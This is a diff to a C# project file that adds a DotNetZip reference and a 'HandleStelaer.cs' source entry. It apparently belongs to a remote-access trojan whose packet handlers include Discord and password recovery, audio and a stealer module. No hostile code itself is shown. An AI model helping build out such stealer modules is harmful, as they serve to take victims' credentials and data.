@@ -74,6 +74,9 @@
       <HintPath>..\packages\dnlib.3.3.2\lib\net45\dnlib.dll</HintPath>
       <EmbedInteropTypes>False</EmbedInteropTypes>
     </Reference>
+    <Reference Include="DotNetZip, Version=1.16.0.0, Culture=neutral, PublicKeyToken=6583c7c814667745, processorArchitecture=MSIL">
+      <HintPath>..\packages\DotNetZip.1.16.0\lib\net40\DotNetZip.dll</HintPath>
+    </Reference>
     <Reference Include="FastColoredTextBox, Version=2.16.24.0, Culture=neutral, PublicKeyToken=fb8aa12b994ef61b, processorArchitecture=MSIL">
       <HintPath>..\packages\FCTB.2.16.24\lib\FastColoredTextBox.dll</HintPath>
       <EmbedInteropTypes>False</EmbedInteropTypes>
@@ -312,6 +315,7 @@
     <Compile Include="Forms\FromRecovery.Designer.cs">
       <DependentUpon>FromRecovery.cs</DependentUpon>
     </Compile>
+    <Compile Include="Handle Packet\HandleStelaer.cs" />
     <Compile Include="Handle Packet\HandleAudio.cs" />
     <Compile Include="Handle Packet\HandleDiscordRecovery.cs" />
     <Compile Include="Handle Packet\HandleFun.cs" />
